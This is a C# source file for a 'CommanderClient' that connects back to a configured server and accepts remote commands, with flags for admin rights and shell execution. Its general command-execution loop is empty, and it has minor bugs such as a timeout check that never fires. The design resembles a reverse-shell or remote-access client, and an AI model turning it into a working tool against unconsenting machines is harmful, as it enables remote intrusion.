using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace CommanderClient
{
	class Listener
	{
		public static string ipAddr { get; set; }
		public static string port { get; set; }
		public static string CustomName { get; set; }
		public static Process CommandProcess;

		private static Socket ServerSocket;
		public static void Run() {
			Thread th = new Thread(new ThreadStart(ClientThread));
			th.Start();
		}
		static void ClientThread() {
			//this thread will retry to connect when disconnected
			IPAddress ip = IPAddress.Parse(Listener.ipAddr);
			ServerSocket = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			Thread th = new Thread(new ThreadStart(ListenToServer));
			while (true) {
				Thread.Sleep(6000);     //wait for a minute for next retry
				if (!ServerSocket.Connected) {
					try {
						Console.WriteLine("Connecting...");
						ServerSocket.Connect(ip, int.Parse(Listener.port));
						Console.WriteLine("Connected. Starting listenning thread.");
						th.Start();
					} catch (Exception ex) { Program.logger.Log(logType.Error, ex.Message); }
				}
			}
		}
		public static void ListenToServer() {
			//this thread will get and read received text
			Console.WriteLine("Listen Thread has been run");
			while (ServerSocket.Connected) {
				if (Read(true, out string text)) {
					Console.WriteLine("Data received");
					readInput(text);
				}
			}
		}
		static void readInput(string Text) {        //this method reads received text
			Console.WriteLine("readInput(\"{0}\")", Text);
			string flags = Regex.Match(Text, @"^\<.+\>\b", RegexOptions.Multiline).Value;	//get flags by regex (example)-> https://regexr.com/4obl9 recommend to use external browser.
			Text = Text.Substring(flags.Length);		//remove flags
			flags=flags.Trim('<', '>');
			Console.WriteLine("Flags:\"{0}\"\nData:\"{1}\"", flags, Text);

			//Flages: $:server_message, e:just_check_exit_code, a:run_as_admin, v:visible_cmd_window, n:normal, s:shell execute

			if (flags.Contains("$")) {
				//internall commands flag
				//this line must run by internalcmd.Do
				Console.WriteLine("Internal Command:\"{0}\"", Text);
				Program.internalCmd.Do(Text);
			} else {
				//common command
				foreach (char f in flags) {
				}
			}
		}
		public static int WaitSec { get; set; }

		public static bool Read(bool Wait, out string Text) {
			Text = "";
			int count = 0;
			var t = DateTime.Now;
			while (true) {
					try {
						byte[] buffer = new byte[1024];
						count = ServerSocket.Receive(buffer);
						Text += Encoding.ASCII.GetString(buffer, 0, count);
					} catch (Exception ex) { Program.logger.Log(logType.Error, $"EXCEPTION IN CLIENT/READ: {ex.Message}"); break; }
					 if(Text.Contains("<$eof>")){
						break;
					}else if(count==0){
						if(Wait){
							if( (t - DateTime.Now) >= new TimeSpan(0, 0, WaitSec) )
								break;
						}else
							break;
					}
				}
				bool Empty=Text=="";
			if (Text.Length != 0) {
				try { Text=Text.Replace("<$eof>", ""); } catch { /*do nothing*/ }
			}
			return !Empty;
		}
		public static void Send(string Text) {
			Text += "<$eof>";
			byte[] buffer = Encoding.ASCII.GetBytes(Text);
			try {
				ServerSocket.Send(buffer);
			} catch (Exception ex) { Program.logger.Log(logType.Error, $"EXCEPTION IN SERVER/SEND: {ex.Message}"); }

		}
	}
}